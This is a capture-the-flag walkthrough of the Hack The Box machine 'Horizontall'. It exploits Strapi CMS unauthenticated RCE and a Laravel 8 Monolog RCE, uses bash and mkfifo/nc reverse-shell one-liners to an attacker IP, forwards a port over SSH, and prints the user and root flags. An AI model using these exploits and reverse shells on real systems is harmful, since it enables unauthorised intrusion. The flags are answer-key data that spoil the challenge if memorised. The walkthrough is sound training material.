---
title: "Horizontal from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Horizontall from HTB
on site `app.......js`
showed this:
```bash
methods: {
                getReviews: function() {
                    var t = this;
                    r.a.get("http://api-         prod.horizontall.htb/reviews").then((function(s) {
                        return t.reviews = s.data
                    }
                    ))
                }
            }
        }
```
Let's add this subdomain to `/etc/hosts`
`gobuster`gave this
```bash
/reviews              (Status: 200) [Size: 507]
/users                (Status: 403) [Size: 60]
/admin                (Status: 200) [Size: 854]
/%c0                  (Status: 400) [Size: 69]
```
the `/admin`shows that it runs on `strapi`
```bash
searchsploit strapi
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)      | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (A | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE | multiple/webapps/50239.py
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthentica | nodejs/webapps/50716.rb
```
Then download it:
```bash
searchsploit -m multiple/webapps/50239.py
  Exploit: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/50239
     Path: /usr/share/exploitdb/exploits/multiple/webapps/50239.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/giorgi/50239.py
```
Then execute it.
```bash
 python3 strapi-50239.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzI0NDg4NTk0LCJleHAiOjE3MjcwODA1OTR9.6LTKqQv8t-0-v9GxJ9m8kV1fjnGI3Semgn07f5D2j9A

$> bash -c 'bash -i >& /dev/tcp/10.10.16.7/1234 0>&1'
```
In `netcat`
```bash
rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.105] 39506
bash: cannot set terminal process group (2009): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$
```
***
User Flag is: e8c0ec1b4cac6c52e7c922f854fbc078
***
```bash
ss -tlnp
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*
LISTEN   0         128               127.0.0.1:1337             0.0.0.0:*        users:(("node",pid=2009,fd=31))
LISTEN   0         128               127.0.0.1:8000             0.0.0.0:*
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*
```
use `curl`to learn what are on this ports
```bash
strapi@horizontall:~$ curl 127.0.0.1:8000
curl 127.0.0.1:8000
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
```
Let's forward the port with `ssh`
```bash
ssh -i id_rsa -L 8000:localhost:8000 strapi@10.10.11.105
```
then access it
```
127.0.0.1:8000
```
It is an `laravel v8`, searching exploit on it we can find `github repository`which allows `RCE`
and we can get `reverse shell`
https://github.com/ambionics/laravel-exploits
running this code now can give `reverse shell`in which we will be root
```python
 python3 laravel-8.py http://localhost:8000  Monolog/RCE1 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.7 1234 >/tmp/f'
```
now on `netcat`
```bash
rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.105] 39600
sh: 0: can't access tty; job control turned off
#
```
***
Root Flag is: a5140c79b048ef0a495489d211c7852d
***
![](/assets/images/2024-08-24_13-20-51.png)
